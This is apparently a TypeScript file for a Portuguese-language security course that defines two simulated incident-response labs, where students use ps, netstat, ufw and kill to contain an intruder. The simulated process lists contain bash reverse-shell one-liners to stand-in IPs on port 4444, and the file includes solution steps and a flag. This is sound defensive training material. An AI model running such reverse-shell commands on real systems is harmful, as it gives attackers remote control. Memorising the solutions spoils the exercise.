import { dir, file, ran, ipBlocked, processExists } from "./terminal-engine";
import type { Scenario } from "./terminal-engine";

/**
 * Laboratórios do módulo "Firewall ao vivo: bloqueando em tempo real" (episódio 55).
 * Comandos novos: netstat (lista conexões, cruzando com o PID do ps) e ufw (bloqueia um IP).
 * Contenção completa = bloquear a rede (ufw) E encerrar o processo (kill, já ensinado no ep. 48).
 */

// ======================= Lab 1: contenção guiada (sem cronômetro) =======================

const loja = {
  hostname: "loja-online",
  ip: "10.0.0.30",
  ports: [
    { port: 22, service: "ssh" },
    { port: 443, service: "https" },
  ],
  users: { root: { home: "/root" } },
};

export const TERM_FIREWALL_CONTAIN: Scenario = {
  id: "term-firewall-contain",
  start: { ip: "10.0.0.30", user: "root" },
  welcome: [
    "Terminal do laboratório (simulado).",
    "O monitoramento notou tráfego de saída incomum na porta 4444. Investigue e contenha.",
  ],
  commands: ["help", "cat", "ps", "kill", "netstat", "ufw"],
  machines: [
    {
      ...loja,
      fs: dir({
        root: dir({
          "missao.txt": file(
            [
              "O time de monitoramento notou tráfego de saída incomum na porta 4444,",
              "um padrão clássico de shell reversa.",
              "",
              "1) Veja os processos rodando (ps) e as conexões ativas (netstat).",
              "2) Cruze o PID da conexão suspeita com o processo dono.",
              "3) Contenha a ameaça: bloqueie o IP no firewall E encerre o processo.",
            ].join("\n")
          ),
        }),
      }),
      processes: [
        { pid: 1204, user: "www-data", cmd: "nginx: worker process" },
        { pid: 4931, user: "www-data", cmd: "bash -i >& /dev/tcp/203.0.113.44/4444 0>&1" },
      ],
      connections: [
        { remoteIp: "198.51.100.20", remotePort: 51322, localPort: 443, pid: 1204, state: "ESTABLISHED" },
        { remoteIp: "203.0.113.44", remotePort: 47711, localPort: 4444, pid: 4931, state: "ESTABLISHED" },
      ],
    },
  ],
  tasks: [
    { label: "Ler a missão (cat missao.txt)", done: (st) => ran(st, /^cat\b.*missao\.txt/) },
    { label: "Ver os processos rodando (ps)", done: (st) => ran(st, /^ps\b/) },
    { label: "Ver as conexões de rede ativas (netstat)", done: (st) => ran(st, /^netstat\b/) },
    { label: "Bloquear o IP malicioso no firewall", done: (st) => ipBlocked(st, "203.0.113.44", "10.0.0.30") },
    { label: "Encerrar o processo malicioso", done: (st) => !processExists(st, 4931, "10.0.0.30") },
  ],
  solution: ["cat missao.txt", "ps", "netstat", "ufw deny from 203.0.113.44", "kill 4931"],
};

// ======================= Lab 2: contenção sob pressão, com um alvo isca (CRONOMETRADO) =======================

const portal = {
  hostname: "portal-educa-web",
  ip: "10.0.0.31",
  ports: [
    { port: 22, service: "ssh" },
    { port: 443, service: "https" },
  ],
  users: { root: { home: "/root" } },
};

const FLAG_FIREWALL = "FLAG{bloquear_a_rede_e_matar_o_processo_fecha_o_cerco}";

export const TERM_FIREWALL_LIVE: Scenario = {
  id: "term-firewall-live",
  start: { ip: "10.0.0.31", user: "root" },
  flag: FLAG_FIREWALL,
  welcome: [
    "⏱ CRONÔMETRO ATIVO — laboratório simulado.",
    "Múltiplas conexões ativas no servidor. Só uma é a ameaça real. Contenha-a.",
  ],
  commands: ["help", "cat", "ps", "kill", "netstat", "ufw"],
  timeLimitSeconds: 200,
  timeoutMessage: "Tempo esgotado! Enquanto você decidia, a shell reversa continuava aberta para fora. Tente de novo.",
  machines: [
    {
      ...portal,
      fs: dir({
        root: dir({
          "missao.txt": file(
            [
              "O portal está com 3 conexões de saída incomuns. NEM TODAS são ataque —",
              "uma delas é o backup noturno automático, de sempre.",
              "",
              "Cruze ps com netstat para separar o que é rotina do que é ameaça.",
              "Bloqueie o IP malicioso no firewall E encerre só o processo malicioso.",
              "Encerrar o processo errado não desfaz a contenção, mas atrapalha o backup.",
            ].join("\n")
          ),
        }),
      }),
      processes: [
        { pid: 1150, user: "www-data", cmd: "nginx: worker process" },
        {
          pid: 812,
          user: "root",
          cmd: "rsync -az /var/www backup@203.0.113.90:/backups",
          warnOnKill: "Você encerrou o backup noturno automático (processo legítimo). A ameaça real continua de pé.",
        },
        { pid: 2290, user: "www-data", cmd: "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1", warnOnKill: `Processo encerrado. Conexão reversa com 198.51.100.77:4444 interrompida. ${FLAG_FIREWALL}` },
      ],
      connections: [
        { remoteIp: "192.0.2.15", remotePort: 51900, localPort: 443, pid: 1150, state: "ESTABLISHED" },
        { remoteIp: "203.0.113.90", remotePort: 22, localPort: 51022, pid: 812, state: "ESTABLISHED" },
        { remoteIp: "198.51.100.77", remotePort: 38821, localPort: 4444, pid: 2290, state: "ESTABLISHED" },
      ],
    },
  ],
  solution: ["cat missao.txt", "ps", "netstat", "ufw deny from 198.51.100.77", "kill 2290"],
};

export const TERMINAL_FIREWALL_SCENARIOS: Record<string, Scenario> = {
  "term-firewall-contain": TERM_FIREWALL_CONTAIN,
  "term-firewall-live": TERM_FIREWALL_LIVE,
};
